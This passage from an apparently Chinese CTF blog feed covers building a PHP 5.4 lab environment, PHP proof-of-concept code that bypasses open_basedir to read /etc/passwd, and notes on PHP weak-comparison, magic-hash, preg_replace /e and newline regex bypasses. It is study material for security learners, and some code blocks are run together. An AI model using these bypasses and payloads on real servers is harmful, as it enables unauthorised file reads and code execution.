aXl1bmNzLmNvbS91YnVudHUvIHhlbmlhbC1zZWN1cml0eSBtYWluDQpkZWIgaHR0cDovL21pcnJvcnMuY2xvdWQuYWxpeXVuY3MuY29tL3VidW50dS8geGVuaWFsLXNlY3VyaXR5IHVuaXZlcnNlDQpkZWItc3JjIGh0dHA6Ly9taXJyb3JzLmNsb3VkLmFsaXl1bmNzLmNvbS91YnVudHUvIHhlbmlhbC1zZWN1cml0eSB1bml2ZXJzZQ0KIyBkZWIgaHR0cDovL21pcnJvcnMuY2xvdWQuYWxpeXVuY3MuY29tL3VidW50dS8geGVuaWFsLXNlY3VyaXR5IG11bHRpdmVyc2UNCiMgZGViLXNyYyBodHRwOi8vbWlycm9ycy5jbG91ZC5hbGl5dW5jcy5jb20vdWJ1bnR1LyB4ZW5pYWwtc2VjdXJpdHkgbXVsdGl2ZXJzZQ==&quot;</span>|<span class="hljs-built_in">base64</span> -d &gt; /etc/apt/sources.list<br><br><span class="hljs-comment"># 安装必要环境</span><br>apt-get install vim wget net-tools curl<br><br><span class="hljs-comment"># 安装编译php需要的环境 eg:https://github.com/php/php-src#building-php-source-code</span><br><span class="hljs-comment"># 安装apache2-dev是因为php只能在编译时载入apache模块，所以我们需要--with-apxs2参数</span><br>apt install -y pkg-config build-essential autoconf bison re2c libxml2-dev libsqlite3-dev apache2 apache2-dev<br></code></pre></td></tr></table></figure><h2 id="下载并编译安装php"><a href="#下载并编译安装php" class="headerlink" title="下载并编译安装php"></a>下载并编译安装php</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#下载解压php-5.4.45 eg: https://www.php.net/releases/</span><br><span class="hljs-built_in">cd</span> /root<br>wget https://www.php.net/distributions/php-5.4.45.tar.bz2<br>tar jxvf php-5.4.45.tar.bz2<br><br><span class="hljs-comment"># 编译php-5.4.45  参数可通过 ./configure -h 查看</span><br><span class="hljs-built_in">cd</span> php-5.4.45<br>./buildconf --force<br>./configure --prefix=/home/php/php5445 --exec-prefix=/home/php/php5445/execdir --with-apxs2<br>make<br>make install<br><span class="hljs-comment"># 下面这个命令是make install 后提示的命令，不知道具体是什么作用</span><br>/usr/share/apr-1.0/build/libtool --finish /root/php-5.4.45/libs<br><span class="hljs-comment"># 创建 php.ini 文件</span><br><span class="hljs-built_in">mv</span> /root/php-5.4.45/php.ini-development /home/php/php5445/execdir/lib/php.ini<br><span class="hljs-comment"># 配置环境变了</span><br><span class="hljs-built_in">export</span> PATH=<span class="hljs-string">&quot;/home/php/php5445/execdir/bin/:<span class="hljs-variable">$PATH</span>&quot;</span> &gt;&gt; ~/.bashrc<br><span class="hljs-comment"># 刷新环境</span><br><span class="hljs-built_in">source</span> ~/.bashrc<br></code></pre></td></tr></table></figure><ul><li>安装目录在 <code>/home/php/php5445</code></li><li>执行文件目录在 <code>/home/php/php5445/execdir/bin</code></li></ul><p>由于我们并没有附带任何其他参数，执行的是 PHP 的默认安装，所以只安装了如下模块：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Core ctype <span class="hljs-built_in">date</span> dom ereg fileinfo filter <span class="hljs-built_in">hash</span> iconv json libxml pcre PDO pdo_sqlite Phar posix Reflection session SimpleXML SPL sqlite3 standard tokenizer xml xmlreader xmlwriter<br></code></pre></td></tr></table></figure><ol start="3"><li>我们使用默认配置编译php，如果需要安装其他扩展，可能需要如下库。（下文我们会示例介绍如何编译安装mysql扩展）</li></ol><h2 id="如何编译其他模块"><a href="#如何编译其他模块" class="headerlink" title="如何编译其他模块"></a>如何编译其他模块</h2><p>对于日常可能用的模块，我们需要先下载如下库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-get install zlib1g-dev libbz2-dev libcurl4-openssl-dev openssl libssl-dev libpng-dev libjpeg-dev libmcrypt-dev libedit-dev libreadline-dev libmysqlclient-dev<br></code></pre></td></tr></table></figure><ul><li><code>libedit-dev libreadline-dev</code> 是 <code>php -a</code> 也就是 php 交互模式需要的库 (readline 模块)</li></ul><p>我会在下文示例编译安装 pdo_mysql 库，其他库的安装大同小异。</p><h1 id="配合apache2"><a href="#配合apache2" class="headerlink" title="配合apache2"></a>配合apache2</h1><h2 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 更换监听端口</span><br>sed -i <span class="hljs-string">&#x27;s|Listen 80|Listen 8888|&#x27;</span> /etc/apache2/ports.conf<br><span class="hljs-comment">#设置php文件处理模块</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;U2VydmVyTmFtZSBsb2NhbGhvc3QKCjxGaWxlc01hdGNoIFwucGhwJD4KICAgIFNldEhhbmRsZXIgYXBwbGljYXRpb24veC1odHRwZC1waHAKPC9GaWxlc01hdGNoPg==&#x27;</span> | <span class="hljs-built_in">base64</span> -d &gt;&gt; /etc/apache2/apache2.conf<br><br><span class="hljs-comment"># 因为我们编译的php是线程不安全型，所以需要设置一下apache</span><br>a2dismod mpm_event<br>a2enmod mpm_prefork<br><br><span class="hljs-comment">#重启apache2</span><br>service apache2 restart<br></code></pre></td></tr></table></figure><p>访问 <code>http://ip:8888</code>  成功运行<img src="/../img/1.png"></p><h1 id="配合Mysql"><a href="#配合Mysql" class="headerlink" title="配合Mysql"></a>配合Mysql</h1><h2 id="安装-mysql5-7"><a href="#安装-mysql5-7" class="headerlink" title="安装 mysql5.7"></a>安装 <code>mysql5.7</code></h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">apt</span>-get install mysql-client-<span class="hljs-number">5</span>.<span class="hljs-number">7</span> mysql-server-<span class="hljs-number">5</span>.<span class="hljs-number">7</span> -y<br><span class="hljs-comment"># 输入密码</span><br></code></pre></td></tr></table></figure><h2 id="编译安装-mysqlnd-扩展（必须先安装它）"><a href="#编译安装-mysqlnd-扩展（必须先安装它）" class="headerlink" title="编译安装 mysqlnd 扩展（必须先安装它）"></a>编译安装 <code>mysqlnd</code> 扩展（必须先安装它）</h2><p>如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 进入mysql的ext目录</span><br><span class="hljs-built_in">cd</span> /root/php-5.4.45/ext/mysqlnd<br><span class="hljs-built_in">mv</span> config9.m4 config.m4<br>phpize<br>./configure --with-php-config=$(<span class="hljs-built_in">which</span> php-config)<br><span class="hljs-comment"># 执行 make 命令会出现报错，看下文即可解决，解决后再继续执行如下命令</span><br>make<br></code></pre></td></tr></table></figure><blockquote><p>上述报错如下:</p><p><img src="/../img/2.png"></p><p>执行下列命令即可解决</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 更换php_mysqlnd_config.h为 config.h</span><br>sed -i <span class="hljs-string">&#x27;s|ext/mysqlnd/php_mysqlnd_config.h|ext/mysqlnd/config.h|&#x27;</span> /root/php-5.4.45/ext/mysqlnd/mysqlnd_portability.h<br><span class="hljs-comment"># 更换相对路径为绝对路径</span><br>sed -i <span class="hljs-string">&#x27;s|ext/mysqlnd|/root/php-5.4.45/ext/mysqlnd|&#x27;</span> /root/php-5.4.45/ext/mysqlnd/mysqlnd_portabilit.h<br><br></code></pre></td></tr></table></figure></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 继续执行命令makemake install# 更改 /home/php/php5445/execdir/lib/php.ini 配置echo extension=mysqlnd.so &gt;&gt; /home/php/php5445/execdir/lib/php.ini</span><br></code></pre></td></tr></table></figure><p>执行 <code>php -a</code> 可看到成功加载<img src="/../img/3.png"></p><h2 id="编译安装-pdo-msyql-扩展"><a href="#编译安装-pdo-msyql-扩展" class="headerlink" title="编译安装 pdo_msyql 扩展"></a>编译安装 <code>pdo_msyql</code> 扩展</h2><p>执行下列命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 进入 pdo_mysql 源文件夹cd /root/php-5.4.45/ext/pdo_mysql/phpize./configure --with-php-config=$(which php-config) --with-pdo-mysqlmakemake installecho &quot;extension=pdo_mysql.so&quot; &gt;&gt; /home/php/php5445/execdir/lib/php.ini</span><br></code></pre></td></tr></table></figure><p>查看php安装的模块 <code>php -m</code> ，成功安装 pdo_mysql 扩展 <img src="/images/6.png"></p><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><ol><li>启动环境</li></ol><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean"># 启动 mysqlservice mysql restart# 启动 apacheservice apache2 restart<br></code></pre></td></tr></table></figure><ol start="2"><li>更改 index.php 代码</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;PD9waHANCnRyeSB7DQogICAgJGRiaCA9IG5ldyBQRE8oJ215c3FsOmhvc3Q9MTI3LjAuMC4xO2RibmFtZT1teXNxbCcsICdyb290JywgJ3Jvb3QnKTsNCiAgICBmb3JlYWNoKCRkYmgtPnF1ZXJ5KCdzaG93IGRhdGFiYXNlcycpIGFzICRyb3cpIHsNCiAgICAgICAgcHJpbnRfcigkcm93KTsNCiAgICB9DQogICAgJGRiaCA9IG51bGw7DQp9IGNhdGNoIChQRE9FeGNlcHRpb24gJGUpIHsNCiAgICBwcmludCAiRXJyb3IhOiAiIC4gJGUtPmdldE1lc3NhZ2UoKSAuICI8YnIvPiI7DQogICAgZGllKCk7DQp9DQo/Pg==&quot;</span> |<span class="hljs-built_in">base64</span> -d &gt; /var/www/html/index.php<br></code></pre></td></tr></table></figure><p><img src="/../img/5.png"></p><p>访问 <code>curl localhost:8888</code></p><p><img src="/../img/1.png"></p><p>环境配置成功。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1>]]></content>
    
    
    <categories>
      
      <category>环境搭建</category>
      
    </categories>
    
    
    <tags>
      
      <tag>环境</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>绕过open_basedir</title>
    <link href="/2024/08/31/%E7%BB%95%E8%BF%87open-basedir/"/>
    <url>/2024/08/31/%E7%BB%95%E8%BF%87open-basedir/</url>
    
    <content type="html"><![CDATA[<h1 id="绕过open-basedir"><a href="#绕过open-basedir" class="headerlink" title="绕过open_basedir"></a>绕过open_basedir</h1><p><a href="https://xz.aliyun.com/t/10070">https://xz.aliyun.com/t/10070</a></p><h2 id="利用ini-set和chidr"><a href="#利用ini-set和chidr" class="headerlink" title="利用ini_set和chidr"></a>利用ini_set和chidr</h2><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li>twitter</li><li><a href="https://xz.aliyun.com/t/4720">https://xz.aliyun.com/t/4720</a></li></ul><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php<br>chdir(<span class="hljs-string">&#x27;subDir&#x27;</span>);<br>ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);<br>chdir(<span class="hljs-string">&#x27;..&#x27;</span>);<br>chdir(<span class="hljs-string">&#x27;..&#x27;</span>);<br>chdir(<span class="hljs-string">&#x27;..&#x27;</span>);<br>ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<br>$a=file_get_contents(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>);<br>var_dump($a);<br></code></pre></td></tr></table></figure><h2 id="利用symlink"><a href="#利用symlink" class="headerlink" title="利用symlink"></a>利用symlink</h2><h3 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h3><ul><li>twitter</li></ul><h3 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&#x27;/var/www/html/a/b/c/d/e/f/g/&#x27;</span>,<span class="hljs-number">0777</span>,<span class="hljs-literal">TRUE</span>);<br><span class="hljs-title function_ invoke__">symlink</span>(<span class="hljs-string">&#x27;/var/www/html/a/b/c/d/e/f/g&#x27;</span>,<span class="hljs-string">&#x27;foo&#x27;</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/var/www/html:bar/&#x27;</span>);<br><span class="hljs-title function_ invoke__">symlink</span>(<span class="hljs-string">&#x27;foo/../../../../../../&#x27;</span>,<span class="hljs-string">&#x27;bar&#x27;</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;foo&#x27;</span>);<br><span class="hljs-title function_ invoke__">symlink</span>(<span class="hljs-string">&#x27;/var/www/html&#x27;</span>,<span class="hljs-string">&#x27;foo&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;bar/etc/passwd&#x27;</span>);<br></code></pre></td></tr></table></figure><p>每次要更换文件夹a和bar和foo，不然会报错文件已存在。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>其他版本的 php 环境搭建大同小异。</p>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>rce</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php代码审计</title>
    <link href="/2024/08/31/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2024/08/31/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="php函数漏洞"><a href="#php函数漏洞" class="headerlink" title="php函数漏洞"></a>php函数漏洞</h1><h2 id="1"><a href="#1" class="headerlink" title="(1) = == ==="></a>(1) <code>=</code> <code>==</code> <code>===</code></h2><ul><li><code>=</code> 赋值</li><li><code>==</code> 与 <code>!=</code> 将类型转为相同类型再比较<ul><li>字符串中含 <code>.eE</code> 且满足数值在整数范围解释为 <code>float</code>，但 <code>float</code> 中有不是正常的东西就是 <code>0</code></li><li><code>&quot;admin&quot; == 0</code>、<code>&quot;1admin&quot; == 1</code>、<code>&quot;admin1&quot; == 0</code></li><li><code>1 + &quot;bob-1.3e3&quot; == 1</code> </li><li>以 <code>0e</code> 开头的被默认为 <code>0</code></li><li><code>1</code> 表示为 <code>true</code>，<code>0</code> 是 <code>false</code> 和 <code>null</code></li><li>数组表示 <code>null</code> 和 <code>false</code></li><li><code>true == -1</code> </li><li><code>&quot;-1&quot; == -1</code></li><li><code>1.0000000000000001 == 1</code></li></ul></li><li><code>===</code> 与 <code>!==</code> 强比较，类型和值都比<ul><li><code>array === array</code></li><li><code>name[] = a</code></li></ul></li><li>比较漏洞 - 进制比较<ul><li><p>在 PHP 中，只要开头为 <code>0X</code> 的字符串会被认为是 16 进制，在弱类型比较漏洞中，16 进制会先被转换成 10 进制再进行比较，所以只要传入一个带有 <code>0x</code> 的字符串也能够与数字进行比较并且返回 <code>true</code>。</p></li><li><p>在 PHP 中, 如果 <code>bool</code> 和 “任何其他类型” 比较，”任何其他类型” 会转换为 <code>bool</code>。</p></li><li><p>在 PHP 中当转换为 boolean 时，以下值被认为是 <code>FALSE</code>：</p><ol><li>布尔值 <code>FALSE</code> 本身</li><li>整型值 <code>0</code>（零）</li><li>浮点型值 <code>0.0</code>（零）</li><li>空字符串，以及字符串 “0”</li><li>不包括何元素的数组（注意，一旦包含元素，就算包含的元素只是一个空数组，也是 <code>true</code>）</li><li>不包括任何成员变量的对象（仅 PHP 4.0 适用）</li><li>特殊类型 <code>NULL</code>（包括尚未赋值的变量）</li><li>从空标记生成的 SimpleXML 对象</li><li>所有其它值包括 <code>-1</code> 都被认为是 <code>TRUE</code> （包括任何资源）</li></ol></li></ul></li></ul><h2 id="2-intval"><a href="#2-intval" class="headerlink" title="(2) intval"></a>(2) <code>intval</code></h2><ul><li>转换为整型，在 PHP5 左右 <code>intval(a)</code> 与 <code>intval(a + 1)</code>，<code>a</code> 传入 <code>2e5</code> 返回 <code>2</code> 和 <code>200001</code></li><li><code>intval()</code> 转换的时候，会将从字符串的开始进行转换直到遇到一个非数字的字符。即使出现无法转换的字符串，<code>intval()</code> 不会报错而是返回 <code>0</code>。</li><li><code>877%00a</code>，再用 <code>intval</code> 函数获取整数部分得到 <code>877</code></li></ul><h2 id="3-md5"><a href="#3-md5" class="headerlink" title="(3) md5"></a>(3) <code>md5</code></h2><ul><li><code>md5 == md5($md5)</code></li><li>常见 MD5 加密后为 <code>0e</code> 开头的字符串为：<code>QNKCDZO</code>、<code>s878926199a</code>、<code>s155964671a</code>、<code>s214587387a</code> 等。</li><li>因为 <code>md5</code> 函数不能处理数组，加密数组的时候会返回 <code>NULL</code>，对于这种情况也可以用来绕过某些场景，除此之外还有 <code>sha1()</code>&#x2F;<code>strlen()</code>&#x2F;<code>strcmp()</code>&#x2F;<code>strpos()</code>。</li><li>对于使用 <code>===</code> 强比较的情况，上述方法均失效。不过可以使用 MD5 加密后的两个完全相等的字符串来进行绕过，可以利用 <code>fastcoll</code> 来生成：<code>fastcoll_v1.0.0.5.exe -p 1.txt -o 1</code></li></ul><h2 id="4-变量覆盖"><a href="#4-变量覆盖" class="headerlink" title="(4) 变量覆盖"></a>(4) 变量覆盖</h2><ol><li><p><strong><code>extract</code></strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">   <span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;a&quot;</span>;<br>   <span class="hljs-variable">$array</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;a&quot;</span> =&gt; <span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;b&quot;</span> =&gt; <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;c&quot;</span> =&gt; <span class="hljs-string">&quot;C&quot;</span>);<br>   <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$array</span>);<br>   <br>   - 就会有 `abc` 这几个变量了，并且是 `ABC`。<br>   - `<span class="hljs-title function_ invoke__">extract</span>()` 函数使用数组键名作为变量名，使用数组键值作为变量值，当变量中有同名的元素时，该函数默认将原有的值覆盖掉。<br><br><span class="hljs-number">2</span>. **`parse_str` 函数**<br>   ```php<br>   <span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-string">&quot;name=uert&amp;age=68&quot;</span>, <span class="hljs-variable">$myarr</span>);<br></code></pre></td></tr></table></figure><ul><li>将 <code>name</code> 和 <code>age</code> 传入数组中  </li><li><code>parse_str</code> 函数将字符串解析成多个变量，如果设置了第二个变量 <code>result</code>，变量将会以数组元素的形式存入到这个数组，作为替代。</li></ul></li><li><p><strong><code>$$</code> 变量覆盖</strong></p><ul><li><code>$$</code> 变量覆盖要具体结合代码来看，可能会需要借助某个参数进行传递值，也有可能使用 <code>$GLOBALS</code>（引用全局作用域中可用的全部变量）来做题。</li></ul></li></ol><h2 id="5-伪随机数"><a href="#5-伪随机数" class="headerlink" title="(5) 伪随机数"></a>(5) 伪随机数</h2><ul><li><code>mt_rand</code></li><li><code>mt_srand</code></li></ul><h2 id="6-ereg"><a href="#6-ereg" class="headerlink" title="(6) ereg()"></a>(6) <code>ereg()</code></h2><ul><li>字符串对比解析，<code>ereg</code> 函数存在 <code>NULL</code> 截断漏洞，当 <code>ereg</code> 读取字符串时, 如果遇到了 <code>%00</code>，后面的字符串就不会被解析。</li><li>注：这里的 <code>%00</code> 是需要 <code>urldecode</code> 才可以截断的，这是 URL 终止符，且 <code>%00</code> 长度是 1 不是 3。</li></ul><h2 id="7-is-numeric"><a href="#7-is-numeric" class="headerlink" title="(7) is_numeric()"></a>(7) <code>is_numeric()</code></h2><ul><li>利用数组 + 十六进制来进行绕过：<code>a[]=58B</code> 在 PHP 4.x 和 5.x 中导致这个数组元素被误处理为数字。</li><li>对于空字符 <code>%00</code>，无论是 <code>%00</code> 放在前后都可以判断为非数值，而 <code>%20</code> 空格字符只能放在数值后如 <code>58%20s_numeric()</code> 仍然会认为它是一个数字。</li><li>16 进制也可以绕过 <code>is_numeric()</code> 检验，可以用来绕过 SQL 注入里的过滤。</li><li>对于科学计数法来说转换后会保留 <code>e</code> 前面的数字，所以我们可以利用这个特性绕过。例如：<code>?time=0.5276e7</code></li></ul><h2 id="8-str-replace-find-replace-string-count"><a href="#8-str-replace-find-replace-string-count" class="headerlink" title="(8) str_replace(find, replace, string, count)"></a>(8) <code>str_replace(find, replace, string, count)</code></h2><ul><li>将匹配到的字符串替换为指定内容，不过这个函数可以通过双写来绕过这个替换，利用该特性可以绕过一些关键字替换的情况。</li></ul><h2 id="9-preg-replace-pattern-replacement-subject-limit-count"><a href="#9-preg-replace-pattern-replacement-subject-limit-count" class="headerlink" title="(9) preg_replace(pattern, replacement, subject, limit, count)"></a>(9) <code>preg_replace(pattern, replacement, subject, limit, count)</code></h2><ul><li><p>函数的 <code>/e</code> 匹配模式存在命令执行漏洞，不过单纯的替换字符串来说它并不存在双写绕过这种缺陷。</p></li><li><p><code>/e</code> 修饰符表示执行替换中的 PHP 代码（这是 PHP 5.5 之前的一个特性，现在已经被弃用），<code>/i</code> 修饰符表示匹配时忽略大小写。</p></li><li><p>例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$regex</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>, <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>, <span class="hljs-variable">$value</span>);<br></code></pre></td></tr></table></figure><p><code>&#39;strtolower(&quot;\\1&quot;)&#39;</code> 是替换部分，其中 <code>\\1</code> 代表第一个捕获组的内容，这里的作用是将匹配到的文本转换为小写。</p></li><li><p>我们让它变成</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/(.*)/ei&#x27;</span>, <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>, &#123;$&#123;<span class="hljs-title function_ invoke__">phpinfo</span>()&#125;&#125;);<br></code></pre></td></tr></table></figure></li></ul><h2 id="10-if-preg-match-php-im-a"><a href="#10-if-preg-match-php-im-a" class="headerlink" title="(10) if(preg_match(&#39;/^php$/im&#39;,$a))"></a>(10) <code>if(preg_match(&#39;/^php$/im&#39;,$a))</code></h2><ul><li><code>/m</code> 为多行匹配，<code>/i</code> 不区分大小写，<code>/^php$/</code> <code>^</code> 表示以 <code>php</code> 开头和 <code>$</code> 表示以 <code>php</code> 结尾。</li><li>当出现 <code>%0A</code> 的时候会被当做两行处理，此时只匹配一行，后面的行会自动被忽略。实现绕过。</li><li>如果目标字符串中没有 <code>&quot;\n&quot;</code> 字符，或者模式中没有出现 <code>^</code> 或 <code>$</code>，设置这个修饰符不产生任何影响。</li><li>如果正则表达式是 <code>^xxx$</code>，在末尾加个换行符 <code>%0A</code> 就和没加一样在匹配中，但在对比中就不一样了，利用与匹配和对比中的矛盾。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;debu&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Match found!&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;No match!&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">// 访问以下 URL</span><br><span class="hljs-comment">// http://example.com/script.php?debu=aqua_is_cute%0A</span><br><span class="hljs-comment">// 输出结果: Match found!</span><br></code></pre></td></tr></table></figure><ul><li><code>preg_match(pattern, subject, matches, flags, offset);</code><ul><li><p><code>pattern</code>: 正则表达式模式，用于描述你想要匹配的文本格式。通常用斜杠 <code>/</code> 来包围正则表达式。</p><ul><li><p><code>subject</code>: 要搜索的字符串。</p></li><li><p><code>matches</code>: （可选）数组，返回匹配结果。如果有匹配，<code>matches[0]</code> 包含完全匹配的部分，<code>matches[1]</code> 包含第一个捕获组的匹配内容，依此类推。</p></li><li><p><code>flags</code>: （可选）控制匹配行为的标志，例如是否匹配所有结果（<code>PREG_OFFSET_CAPTURE</code>）。</p></li><li><p><code>offset</code>: （可选）指定从字符串的哪个位置开始搜索。</p><ul><li>常见匹配规则：<ul><li><strong>字符类</strong>：匹配特定字符集中的任意字符。<ul><li><code>[A-Za-z0-9]</code>：匹配任意字母（大写或小写）或数字。</li><li><code>[0-9]</code>：匹配任意数字。</li><li><code>[A-Z]</code>：匹配任意大写字母。</li><li><code>[a-z]</code>：匹配任意小写字母。</li></ul></li><li><strong>数量限定符</strong>：<ul><li><code>+</code>：匹配前一个字符一次或多次（1次或以上）。</li><li><code>*</code>：匹配前一个字符零次或多次（0次或以上）。</li><li><code>?</code>：匹配前一个字符零次或一次（0次或1次）。</li><li><code>&#123;n&#125;</code>：匹配前一个字符恰好 n 次。</li><li><code>&#123;n,&#125;</code>：匹配前一个字符至少 n 次。</li><li><code>&#123;n,m&#125;</code>：匹配前一个字符至少 n 次，但不超过 m 次。</li></ul></li><li><strong>锚点</strong>：<ul><li><code>^</code>：匹配字符串的开始。</li><li><code>$</code>：匹配字符串的结束。</li></ul></li><li><strong>预定义字符类</strong>:<ul><li><code>\d</code> 匹配任意数字（相当于 <code>[0-9]</code>）。</li><li><code>\D</code> 匹配任意非数字字符。</li><li><code>\w</code> 匹配任意字母、数字或下划线（相当于 <code>[a-zA-Z0-9_]</code>）。</li><li><code>\W</code> 匹配任意非字母、非数字或非下划线字符。</li><li><code>\s</code> 匹配任意空白字符（空格、制表符等）。</li><li><code>\S</code> 匹配任意非空白字符。</li></ul></li><li><strong>量词</strong>:<ul><li><code>&#123;n&#125;</code> 精确匹配 n 次。</li><li><code>&#123;n,&#125;</code> 至少匹配 n 次。</li><li><code>&#123;n,m&#125;</code> 匹配 n 到 m 次。</li><li><code>*</code> 匹配零次或多次（相当于 <code>&#123;0,&#125;</code>）。</li><li><code>+</code> 匹配一次或多次（相当于 <code>&#123;1,&#125;</code>）。</li><li><code>?</code> 匹配零次或一次（相当于 <code>&#123;0,1&#125;</code>）。</li><li><code>preg_match(&#39;/a&#123;3&#125;/&#39;, &#39;aaa&#39;)</code> &#x2F;&#x2F; 匹配成功，匹配 “aaa”</li><li><code>preg_match(&#39;/a&#123;2,4&#125;/&#39;, &#39;aaaa&#39;)</code> &#x2F;&#x2F; 匹配成功，匹配 “aaaa”</li></ul></li><li><strong>捕获组</strong>:<ul><li>使用圆括号 <code>()</code> 创建捕获组，捕获组中的内容会被捕获到 <code>matches</code> 